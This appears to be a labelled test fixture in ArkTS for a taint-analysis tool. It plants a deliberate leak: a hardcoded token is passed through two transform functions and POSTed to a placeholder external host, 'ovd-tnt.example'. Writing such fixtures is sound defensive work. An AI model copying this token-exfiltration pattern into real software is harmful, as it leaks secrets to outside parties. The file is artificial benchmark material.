// VULN: OVD-TNT-002 三跳跨函数污点链——source→hop1→hop2→sink（CWE-200）
// 令牌常量在 src2、外传 sink 在 ovdTntSink2，中经两次变换；需要过程间分析才能串联。
import http from '@ohos.net.http';

const TOKEN2 = 'tnt2_tok_ovd_b8321d';

function src2(): string {
  return TOKEN2;
}

function hop1(s: string): string {
  return `h1<${s.length}>${s}`;
}

function hop2(s: string): string {
  return s.replace('h1', 'h2');
}

export async function ovdTntSink2(): Promise<string> {
  const payload: string = hop2(hop1(src2()));
  const req: http.HttpRequest = http.createHttp();
  await req.request('https://ovd-tnt.example/ingest2', {
    method: http.RequestMethod.POST,
    header: { 'x-tnt2-flow': '1' },
    extraData: payload
  });
  req.destroy();
  return 'tnt2 sink posted';
}
